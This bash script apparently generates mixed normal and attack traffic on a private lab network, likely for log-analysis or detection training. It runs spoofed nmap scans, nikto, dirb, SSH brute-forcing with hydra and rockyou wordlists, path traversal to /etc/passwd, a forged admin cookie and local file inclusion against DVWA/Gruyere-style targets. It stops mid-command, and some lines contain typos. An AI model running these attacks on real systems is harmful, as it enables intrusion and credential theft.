#!/bin/bash

#files of intrest:

#/var/log/auth.log 
#/var/log/syslog
#/var/log/ufw.log
#/var/log/apache/access.log
#/var/log/apache/error.log
#/var/log/mysql/mysql1.log
#/var/log/mysql/mysql.log
#/var/log/samba/log.smbd
#/var/log/samba/log.wb-OWASPBWA


ZC2="192.168.56.102"
LSA="192.168.56.103"
MSF="192.168.56.108"
OWASP="192.168.56.113"



A1="192.168.56.201"
A2="192.168.56.204"
A3="192.168.56.222"
U1="192.168.56.203"
U2="192.168.56.212"
U3="192.168.56.209"
U4="192.168.56.231"
U5="192.168.56.240"

A1i="eth1:0"
A2i="eth1:1"
A3i="eth1:2"
U1i="eth1:3"
U2i="eth1:4"
U3i="eth1:5"
U4i="eth1:6"
U5i="eth1:7"

ifconfig $A1i $A1
ifconfig $A2i $A2
ifconfig $A3i $A3
ifconfig $U1i $U1
ifconfig $U2i $U2
ifconfig $U3i $U3
ifconfig $U4i $U4
ifconfig $U5i $U5

sleep 5
ifconfig
sleep 10

######### Actual Traffic Sent ##############



curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/jquery/jquery.min.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/bootstrap/js/bootstrap.min.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/scrollreveal/scrollreveal.min.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/magnific-popup/jquery.magnific-popup.min.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/js/creative.min.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/favicon.ico'
sleep 4

curl -i -s -k --inetrface $U2i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/twiki/'



curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/login'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newaccount.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
    $'http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/'


curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'tz_offset=-21600' \
    $'http://192.168.56.113/dvwa/'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/index.php' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/dvwa/js/dvwaPage.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/dvwa/login.php' -H $'Connection: close' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/index.php'





curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=tools.html'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Cookie: PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
    $'http://192.168.56.108/phpMyAdmin/'



nmap -n 192.168.56.0/24 &
sleep 3
nmap -p- $OWASP &
sleep 5
dirb http://$OWASP &> /dev/null &
sleep 4
nikto http://$OWASP &> /dev/null &
sleep 10
hydra -l root -P /usr/share/wordlists/rockyou1000.txt $OWASP ssh &> /dev/null &




sleep 2

curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/gruyere/'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/'
curl -i -s -k --interface $U4i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/lib.js'


sleep 20

curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=admin&Submit=Submit' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=1234&Submit=Submit'





nmap -n -sn 192.168.56.0/24 -e $A1i -S $A1
sleep 10
nmap -n $ZC2 -e $A1i -S $A1
nmap -sV --script=http-enum $ZC2 -e $A1i -S $A1 &>/dev/null &

sleep 5

curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=../../../../etc/passwd'
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/dbadmin/'
sleep 1

curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/dbadmin/' -H $'Cookie: pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'pla3412=admin; pla3412_salt=aoikrcnbndk; PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/dbadmin/test_db.php'
sleep 2
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=../../../../../usr/databases/hack.php'




nmap -n -sn 192.168.56.0/24 -e $A3i -S $32 &
sleep 10
nmap -n -T2 $OWASP -e $A3i -S $A3 &
sleep 5













curl -i -s -k --inetrface $U3i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/twiki/'



curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/login'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newaccount.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
    $'http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/'








curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/jquery/jquery.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/bootstrap/js/bootstrap.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/scrollreveal/scrollreveal.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/magnific-popup/jquery.magnific-popup.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/js/creative.min.js'
curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/favicon.ico'
sleep 4



nmap -n -p- $OWASP -e $A1i -S A1 &>/dev/null &
sleep 7
nmap -n --script ssh-brute --script-args 'userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $OWASP -e $A1i -S A1 &>/dev/null &
sleep 30
nmap -sV --script=http-enum $OWASP -e $A1i -S $A1 &>/dev/null &
sleep 5
nmap -n --script ssh-brute --script-args 'userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $OWASP -e $A1i -S A1 &>/dev/null &


# SQLI
curl -i -s -k --interface $A1i -X $'GET' \
